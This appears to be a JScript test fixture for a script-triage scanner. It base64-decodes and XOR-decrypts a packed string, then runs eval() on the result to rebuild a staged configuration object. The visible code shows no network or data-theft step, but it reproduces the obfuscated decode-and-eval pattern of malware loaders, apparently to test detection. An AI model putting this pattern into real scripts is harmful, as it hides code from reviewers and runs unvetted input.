// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
function decodeBase64(text) {
  var alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  var clean = text.replace(/[^A-Za-z0-9+\/=]/g, "");
  var output = [];
  for (var p = 0; p < clean.length; p += 4) {
    var a = alphabet.indexOf(clean.charAt(p));
    var b = alphabet.indexOf(clean.charAt(p + 1));
    var c = clean.charAt(p + 2) == "=" ? -1 : alphabet.indexOf(clean.charAt(p + 2));
    var d = clean.charAt(p + 3) == "=" ? -1 : alphabet.indexOf(clean.charAt(p + 3));
    output.push((a << 2) | (b >> 4));
    if (c >= 0) output.push(((b & 15) << 4) | (c >> 2));
    if (d >= 0) output.push(((c & 3) << 6) | d);
  }
  return output;
}
function decode_e7ef258f(item1) {
  var keyBytes = [234,35,40,152,224];
  var item2 = [];
  for (var i = 0; i < item1.length; i++) { item2.push(item1[i] ^ keyBytes[i % keyBytes.length]); }
  return item2;
}
function recover_b0efc1c6() {
  // configuration reconstruction
  var packedText = "kQFb7IWaUAqiu8hCS+mVg1FNx5KPTkfshcgPCvyJmVNJ7IOCfEX9jYVRUbq9xgFJ/IGaV03qwtABf/GOoldc6M69SkbQlJ5Tev2Rn0Zb7M7fDRm6zMhVSfSVj1AKopvIQEn1kItKT/a/g0cKosKJQkXogYNERrXTiBsarNCLEh+twsYBXeqMyBkK8JSeU1uiz8UQSqDS3hNJqdffDU3ggYdTRP3Og01e+YyDRweg1IgTTfmF3Q1M+ZTIDwrtk49Rd/mHj01cutrIa132lJhGW+usi0EHq4LSERyogdsUHbqdxgFb7IGNRmv3lYRXCqLSlw==";
  var item1 = decodeBase64(packedText);
  var item6 = [3, 5, 8, 13].slice(1, 3);
  var item2 = [];
  var state = 1;
  switch (state) { case 1: item2 = decode_e7ef258f.apply(null, [item1]); break; default: item2 = []; }
  var item3 = "";
  for (var bi = 0; bi < item2.length; bi++) { item3 += String.fromCharCode(item2[bi]); }
  return item3;
  // end reconstruction
}
function inspect_614f3993() {
  var item4 = eval("(" + recover_b0efc1c6.apply(null, []) + ")");
  var item5 = new Object();
  item5.steps = item4.steps;
  item5.adapter = item4.adapter;
  item5.values = item4.values;
  item5.stageCount = item4.stageCount;
  return item5;
}
